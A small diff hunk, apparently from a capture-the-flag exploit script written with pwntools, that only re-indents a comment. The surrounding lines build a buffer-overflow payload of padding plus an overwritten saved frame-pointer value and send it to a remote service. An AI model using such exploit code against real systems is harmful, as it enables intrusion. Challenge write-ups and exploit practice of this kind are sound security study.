@@ -174,7 +174,7 @@ if __name__ == '__main__':
     rbp_4 = p64(0x1337bab3)
     payload = junk + rbp_4 + b'\n\r'
 		
-		# Remote Connection
+	# Remote Connection
     connection = remote(host, port)
     connection.sendline(payload)
     connection.recvuntil(b'Here\'s a small gift:')
